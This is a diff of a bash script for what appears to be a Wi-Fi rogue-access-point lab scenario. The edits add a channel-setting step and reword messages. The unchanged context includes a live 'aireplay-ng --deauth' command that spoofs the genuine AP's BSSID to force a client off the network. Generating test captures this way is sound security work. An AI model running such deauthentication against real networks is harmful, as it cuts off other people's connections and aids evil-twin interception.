@@ -44,7 +44,7 @@ print_none "Type:          $SCN_CAPTURE"
 print_none "Channel:       $SCN_CHANNEL"
 print_none "Duration:      $SCN_DURATION seconds"
 print_blank
-print_warning "IMPORTANT: Do NOT filter capture by BSSID. Both genuine and rogue AP traffic must be visible."
+print_warn "IMPORTANT: Do NOT filter capture by BSSID. Both genuine and rogue AP traffic must be visible."
 print_action "Launch Capture"
 
 confirmation
@@ -59,6 +59,12 @@ ensure_monitor_mode
 print_success "Interface is in monitor mode."
 print_blank
 
+# --- Set Channel ---
+print_action "Setting interface $INTERFACE to channel $SCN_CHANNEL..."
+sudo iw dev "$INTERFACE" set channel "$SCN_CHANNEL"
+print_success "Channel set to $SCN_CHANNEL."
+print_blank
+
 # --- Launch Forced Disconnect ---
 print_action "Sending deauthentication frames to client $SCN_CLIENT_MAC"
 print_none "Spoofing genuine AP BSSID: $SCN_TARGET_BSSID"
@@ -66,8 +72,8 @@ sudo aireplay-ng --deauth 5 -a "$SCN_TARGET_BSSID" -c "$SCN_CLIENT_MAC" "$INTERF
 print_success "Deauthentication frames sent."
 print_blank
 
-# --- Wait for Attack Duration ---
-print_info "Attack running. Waiting $SCN_DURATION seconds for capture..."
+# --- Wait for Capture Duration ---
+print_info "Waiting $SCN_DURATION seconds for client re-association and traffic capture..."
 sleep "$SCN_DURATION"
 print_blank
 
